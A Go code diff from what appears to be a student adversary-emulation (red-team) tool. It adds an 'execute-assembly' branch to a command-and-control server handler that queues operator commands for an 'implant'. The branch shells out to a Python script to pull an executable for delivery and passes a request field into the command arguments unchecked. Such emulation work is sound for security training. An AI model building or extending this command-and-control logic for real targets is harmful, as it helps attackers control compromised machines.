@@ -5,6 +5,8 @@ import (
 	"fmt"
 	"io/ioutil"
 	"net/http"
+	"os/exec"
+	"strings"
 	"sync"
 )
 
@@ -46,11 +48,26 @@ func fetchCommand(w http.ResponseWriter, r *http.Request) {
 
 		// With the Mutex, we store it in memory
 		mu.Lock()
+		if command.Input == "execute-assembly" {
+			// Run the Python script and capture the output
+			fmt.Println("Getting assembly...")
+			cmd := "cmd"
+			args := []string{"/c", "python", "F:\\capstone-adversary-emulation-tool\\Implementation\\Code\\Vagrant_SSH.py", "-df", "/home/superstar/" + command.File + ".exe"}
+			fmt.Println(cmd, args)
+			out, err := exec.Command(cmd, args...).Output()
+			if err != nil {
+				http.Error(w, err.Error(), http.StatusInternalServerError)
+				return
+			}
+
+			// Override the File field with the output from the Python script
+			command.File = strings.TrimSpace(string(out))
+		}
 		storedCommand = &command
 		mu.Unlock()
 
 		w.WriteHeader(http.StatusOK)
-		fmt.Println("Fetching command:", command.Input, command.File, "for Implant User:", command.ImplantUser, "From Operator:", command.Operator)
+		fmt.Println("Fetching command:", command.Input, "for Implant User:", command.ImplantUser, "From Operator:", command.Operator)
 
 	case "GET":
 		// If the request is a GET request, we unlock the Mutex and release the command for the implant
